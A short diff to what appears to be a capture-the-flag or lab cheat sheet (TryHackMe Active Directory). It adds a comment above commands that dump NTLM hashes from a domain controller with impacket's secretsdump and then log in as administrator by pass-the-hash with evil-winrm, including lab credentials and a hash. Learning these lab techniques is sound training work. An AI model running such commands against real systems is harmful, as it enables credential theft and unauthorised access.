@@ -416,6 +416,7 @@ xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-i
   ```
 #### Pass The Hash
 ```
+#Dump NTLM Hash
 python3 /usr/share/doc/python3-impacket/examples/secretsdump.py THM-AD/backup:backup2517860@10.10.211.190 -dc-ip 10.10.211.190
 
 evil-winrm -i 10.10.211.190 -u administrator -H 0e0363213e37b94221497260b0bcb4fc
